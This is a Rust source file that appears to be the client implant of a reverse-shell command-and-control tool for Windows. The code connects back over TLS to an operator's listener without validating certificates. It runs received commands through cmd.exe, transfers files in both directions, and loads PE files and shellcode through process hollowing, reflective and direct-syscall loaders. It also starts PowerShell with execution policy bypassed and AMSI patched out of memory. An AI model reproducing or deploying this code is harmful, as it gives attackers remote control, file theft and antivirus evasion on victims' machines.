use crate::amsi_bypass::{patch_amsi, start_process_thread};
use crate::loader::{reflective_loader, remote_loader, shellcode_loader};
use crate::loader_syscalls::{
    reflective_loader_syscalls, remote_loader_syscalls, shellcode_loader_syscalls,
};
use crate::utils::tools::{read_and_send_file, receive_and_write_bytes};

use std::error::Error;
use std::fs::File;
use std::io::{Read, Write};
use std::process::{exit, Command, Stdio};
use std::sync::mpsc::{channel, TryRecvError};
use std::sync::{atomic::AtomicBool, atomic::Ordering, Arc};

use native_tls::TlsConnector;
use signal_hook::consts::SIGTERM;
use std::net::TcpStream;

fn do_stuff(cmd: &str) -> Vec<u8> {
    let exec = Command::new("cmd.exe").args(&["/c", cmd]).output().unwrap();

    let stdo = exec.stdout.as_slice();
    let _stdr = exec.stderr.as_slice();

    if _stdr.len() == 0 {
        return stdo.to_vec();
    } else {
        return _stdr.to_vec();
    }
}

fn call_loader_shellcode(
    shellcode_to_load: Vec<u8>,
    pe_to_exec: &str,
    loader: u8,
) -> Result<(), Box<dyn Error>> {
    match loader {
        0 => match shellcode_loader_syscalls(shellcode_to_load, pe_to_exec) {
            Ok(rl) => rl,
            Err(_) => {
                return Err("Shellcode loading error".into());
            }
        },
        1 => match shellcode_loader(shellcode_to_load, pe_to_exec) {
            Ok(rl) => rl,
            Err(_) => {
                return Err("Shellcode loading error".into());
            }
        },
        _ => log::debug!("Invalid loader ID"),
    }
    Ok(())
}

fn call_loader_pe(file_to_load: &str, pe_to_exec: &str, loader: u8) -> Result<(), Box<dyn Error>> {
    let mut buf: Vec<u8> = Vec::new();
    let file = File::open(file_to_load.trim().replace("\\\\", "\\"));
    match file {
        Ok(mut f) => {
            f.read_to_end(&mut buf)?;
            match loader {
                0 => match remote_loader(buf, pe_to_exec) {
                    Ok(rl) => rl,
                    Err(_) => {
                        return Err("PE loading error".into());
                    }
                },
                1 => match remote_loader_syscalls(buf, pe_to_exec) {
                    Ok(rl) => rl,
                    Err(_) => {
                        return Err("PE loading error".into());
                    }
                },
                2 => match reflective_loader(buf) {
                    Ok(rl) => rl,
                    Err(_) => {
                        return Err("PE loading error".into());
                    }
                },
                3 => match reflective_loader_syscalls(buf) {
                    Ok(rl) => rl,
                    Err(_) => {
                        return Err("PE loading error".into());
                    }
                },
                _ => log::debug!("Invalid loader ID"),
            }
        }
        Err(_) => {
            return Err("Error openning file to load".into());
        }
    };

    Ok(())
}

pub fn client(i: &str, p: &str) -> Result<(), Box<dyn Error>> {
    // Connection to server and TLS setup
    let clt = TcpStream::connect(i.to_owned() + ":" + p)?;
    log::debug!(
        "[+] TCP connection success to the listener at {}",
        clt.peer_addr()?
    );
    let mut connector_builder = TlsConnector::builder();
    connector_builder.danger_accept_invalid_certs(true);
    connector_builder.danger_accept_invalid_hostnames(true);
    let connector = connector_builder.build()?;

    let stream = connector.connect("dummy", clt);
    let mut tls_stream = match stream {
        Ok(s) => s,
        Err(r) => {
            log::debug!("TLS handshake error : {:?}", r.source());
            exit(6);
        }
    };

    let os = std::env::consts::FAMILY;
    tls_stream.write(os.as_bytes())?;

    // Cmd execution loop
    loop {
        // Read input from server
        let mut buff = [0; 4096];
        let read = tls_stream.read(&mut buff[0..]);
        let bytes_read = match read {
            Ok(b) => b,
            Err(r) => {
                log::debug!("Reading error : {}", r);
                continue;
            }
        };

        // Check to quit
        if String::from_utf8_lossy(&buff)
            .trim_end_matches('\0')
            .trim_end()
            == "quit"
            || String::from_utf8_lossy(&buff)
                .trim_end_matches('\0')
                .trim_end()
                == "exit"
        {
            log::debug!("Quit");
            break;
        }

        // Check for download/upload commands
        if String::from_utf8_lossy(&buff)
            .trim_end_matches('\0')
            .starts_with("download")
        {
            let tmp = "".to_owned();
            let cmd = tmp + String::from_utf8_lossy(&buff[..bytes_read]).trim_end_matches('\0');
            let path: Vec<&str> = cmd.split(" ").collect();
            match File::open(path[1]) {
                Ok(file) => match read_and_send_file(file, &mut tls_stream) {
                    Ok(_) => (),
                    Err(r) => {
                        log::error!("Error during upload : {}", r);
                        tls_stream.flush().unwrap();
                        continue;
                    }
                },
                Err(r) => {
                    tls_stream.write(r.to_string().as_bytes())?;
                    tls_stream.write_all("EndOfTheFile".as_bytes())?;
                }
            }
        } else if String::from_utf8_lossy(&buff)
            .trim_end_matches('\0')
            .starts_with("upload")
        {
            let tmp = "".to_owned();
            let cmd = tmp + String::from_utf8_lossy(&buff[..bytes_read]).trim_end_matches('\0');
            let path: Vec<&str> = cmd.split(" ").collect();
            match File::create(path[2].trim_end_matches('\0').trim_end()) {
                Ok(mut file) => {
                    tls_stream.write("Creation OK".as_bytes())?;
                    let mut file_buffer = [0; 4096];
                    let mut file_vec: Vec<u8> = Vec::new();
                    match tls_stream.read(&mut file_buffer) {
                        Ok(_) => receive_and_write_bytes(
                            &mut tls_stream,
                            &mut file_vec,
                            &mut file_buffer,
                        )?,
                        Err(r) => {
                            log::debug!("Reading error : {}", r);
                            tls_stream.flush()?;
                            continue;
                        }
                    }
                    file.write(&file_vec)?;
                }
                Err(r) => {
                    log::debug!("File creation error : {}", r);
                    tls_stream
                        .write(("Creation not OK : ".to_owned() + &r.to_string()).as_bytes())?;
                }
            }

        // Check for load command
        } else if String::from_utf8_lossy(&buff)
            .trim_end_matches('\0')
            .starts_with("load -h")
            || String::from_utf8_lossy(&buff)
                .trim_end_matches('\0')
                .starts_with("syscalls -h")
            || String::from_utf8_lossy(&buff)
                .trim_end_matches('\0')
                .starts_with("load -s")
            || String::from_utf8_lossy(&buff)
                .trim_end_matches('\0')
                .starts_with("syscalls -s")
        {
            let tmp = "".to_owned();
            let cmd = tmp + String::from_utf8_lossy(&buff[..bytes_read]).trim_end_matches('\0');
            let path: Vec<&str> = cmd.split(" ").collect();
            if path.len() != 4 {
                if String::from_utf8_lossy(&buff)
                    .trim_end_matches('\0')
                    .starts_with("load -h")
                {
                    tls_stream.write("Invalid argument number. Usage is : load -h C:\\path\\to\\PE_to_load C:\\path\\to\\PE_to_hollow\0".as_bytes())?;
                } else if String::from_utf8_lossy(&buff)
                    .trim_end_matches('\0')
                    .starts_with("syscalls -h")
                {
                    tls_stream.write("Invalid argument number. Usage is : syscalls -h C:\\path\\to\\PE_to_load C:\\path\\to\\PE_to_hollow\0".as_bytes())?;
                }
            } else {
                let load_ret: Result<(), Box<dyn Error>>;
                if String::from_utf8_lossy(&buff)
                    .trim_end_matches('\0')
                    .starts_with("load -h")
                {
                    load_ret = call_loader_pe(
                        path[2].trim_end_matches('\0'),
                        path[3].trim_end_matches('\0'),
                        0,
                    );
                } else if String::from_utf8_lossy(&buff)
                    .trim_end_matches('\0')
                    .starts_with("syscalls -h")
                {
                    load_ret = call_loader_pe(
                        path[2].trim_end_matches('\0'),
                        path[3].trim_end_matches('\0'),
                        1,
                    );
                } else {
                    let mut shellcode_buffer = [0; 4096];
                    let mut shellcode_vec: Vec<u8> = Vec::new();
                    match tls_stream.read(&mut shellcode_buffer) {
                        Ok(_) => {
                            receive_and_write_bytes(
                                &mut tls_stream,
                                &mut shellcode_vec,
                                &mut shellcode_buffer,
                            )?;
                        }
                        Err(r) => {
                            log::debug!("Reading error : {}", r);
                            tls_stream.flush()?;
                            continue;
                        }
                    }
                    if String::from_utf8_lossy(&buff)
                        .trim_end_matches('\0')
                        .starts_with("load -s")
                    {
                        load_ret =
                            call_loader_shellcode(shellcode_vec, path[3].trim_end_matches('\0'), 0);
                    } else {
                        load_ret =
                            call_loader_shellcode(shellcode_vec, path[3].trim_end_matches('\0'), 1);
                    }
                }

                match load_ret {
                    Ok(()) => {
                        tls_stream.write("\0".as_bytes())?;
                    }
                    Err(r) => {
                        tls_stream.write(r.to_string().as_bytes())?;
                    }
                };
            }
        } else if String::from_utf8_lossy(&buff)
            .trim_end_matches('\0')
            .starts_with("load")
            || String::from_utf8_lossy(&buff)
                .trim_end_matches('\0')
                .starts_with("syscalls")
        {
            let tmp = "".to_owned();
            let cmd = tmp + String::from_utf8_lossy(&buff[..bytes_read]).trim_end_matches('\0');
            let path: Vec<&str> = cmd.split(" ").collect();
            if path.len() != 2 {
                if String::from_utf8_lossy(&buff)
                    .trim_end_matches('\0')
                    .starts_with("load")
                {
                    tls_stream.write(
                        "Invalid argument number. Usage is : load C:\\path\\to\\PE_to_load\0"
                            .as_bytes(),
                    )?;
                } else {
                    tls_stream.write(
                        "Invalid argument number. Usage is : syscalls C:\\path\\to\\PE_to_load\0"
                            .as_bytes(),
                    )?;
                }
            } else {
                let load_ret: Result<(), Box<dyn Error>>;
                if String::from_utf8_lossy(&buff)
                    .trim_end_matches('\0')
                    .starts_with("load")
                {
                    load_ret = call_loader_pe(path[1].trim_end_matches('\0'), "", 2);
                } else {
                    load_ret = call_loader_pe(path[1].trim_end_matches('\0'), "", 3);
                }
                match load_ret {
                    Ok(()) => {
                        tls_stream.write("\0".as_bytes())?;
                    }
                    Err(r) => {
                        tls_stream.write(r.to_string().as_bytes())?;
                    }
                };
            }

        // Check for PowerShell w/o AMSI command
        } else if String::from_utf8_lossy(&buff)
            .trim_end_matches('\0')
            .starts_with("powpow")
        {
            // Start the PowerShell process and patch the AMSI in its memory
            let (tx1, rx1) = channel();
            let (tx2, rx2) = channel();
            let mut child = Command::new("powershell.exe")
                .args(["-nop", "-exec", "bypass"])
                .stdin(Stdio::piped())
                .stdout(Stdio::piped())
                .spawn()
                .expect("Failed to start process");

            let amsi_value = String::from_utf8_lossy(&buff)
                .splitn(3, ':')
                .nth(1)
                .unwrap_or("N")
                .trim_end_matches('\0')
                .to_owned();
            println!("{}", amsi_value);
            if amsi_value
                .trim_end_matches('\0')
                .trim_end()
                .eq_ignore_ascii_case("Y")
            {
                let syscalls_value = String::from_utf8_lossy(&buff)
                    .splitn(3, ':')
                    .nth(2)
                    .unwrap_or("N")
                    .trim_end_matches('\0')
                    .to_owned();
                println!("{}", syscalls_value);
                let syscalls_bool = match syscalls_value.trim_end_matches('\0').trim_end() {
                    "Y" => true,
                    "N" => false,
                    _ => false,
                };
                patch_amsi(child.id(), syscalls_bool);
            }

            // Start process thread with in/out pipes
            start_process_thread(&mut child, tx2, rx1)?;

            let should_terminate = Arc::new(AtomicBool::new(false));
            signal_hook::flag::register(SIGTERM, Arc::clone(&should_terminate))?;

            // Receive the PowerShell banner
            loop {
                match rx2.try_recv() {
                    Ok(line) => {
                        if line.starts_with("EndOfOutput") {
                            break;
                        }
                        tls_stream.write(line.as_bytes())?;
                    }
                    Err(TryRecvError::Empty) => {
                        continue;
                    }
                    Err(r) => {
                        log::debug!("Recv error: {:?}", r);
                        tls_stream.write(r.to_string().as_bytes())?;
                        break;
                    }
                }
            }

            // Interactive loop
            while !should_terminate.load(Ordering::Relaxed) {
                buff = [0; 4096];
                match tls_stream.read(&mut buff[0..]) {
                    Ok(_) => (),
                    Err(r) => {
                        log::debug!("Reading error : {}", r);
                        tls_stream.write(r.to_string().as_bytes())?;
                        continue;
                    }
                };
                let cmd = "".to_owned() + String::from_utf8_lossy(&buff).trim_end_matches('\0');

                match tx1.send(String::from(cmd.clone())) {
                    Ok(_) => {
                        if cmd.trim_end_matches('\0').trim_end() == "quit"
                            || cmd.trim_end_matches('\0').trim_end() == "exit"
                        {
                            break;
                        }
                        while !should_terminate.load(Ordering::Relaxed) {
                            match rx2.try_recv() {
                                Ok(line) => {
                                    if line.starts_with("EndOfOutput") {
                                        break;
                                    }
                                    tls_stream.write(line.as_bytes())?;
                                }
                                Err(TryRecvError::Empty) => {
                                    continue;
                                }
                                Err(r) => {
                                    log::debug!("Recv error: {:?}", r);
                                    tls_stream.write(r.to_string().as_bytes())?;
                                    continue;
                                }
                            }
                        }
                    }
                    Err(r) => {
                        log::debug!(
                            "Error sending command to PowerShell through the pipe : {:?}",
                            r
                        );
                        continue;
                    }
                }
            }
            child.kill()?;
        } else {
            // Magic stuff
            let mut res =
                do_stuff(String::from_utf8_lossy(&buff[..bytes_read]).trim_end_matches('\0'));
            if res.len() == 0 {
                tls_stream.write("\0".as_bytes())?;
            } else {
                // Because the TLS max buffer size depends on the underlying library, we cut the paquets to send them into blocks of 4096
                let mut buff_to_send = [0; 4096];
                loop {
                    let mut count = 0;
                    for c in &res {
                        if count == 4096 {
                            break;
                        }
                        buff_to_send[count] = *c;
                        count += 1;
                    }
                    let _ = tls_stream.write(&buff_to_send)?;
                    buff_to_send = [0; 4096];
                    if count < 4096 {
                        break;
                    }
                    let res2 = res.split_off(count);
                    res = res2;
                }
            }
        }
        tls_stream.flush()?;
    }

    tls_stream.shutdown()?;
    Ok(())
}
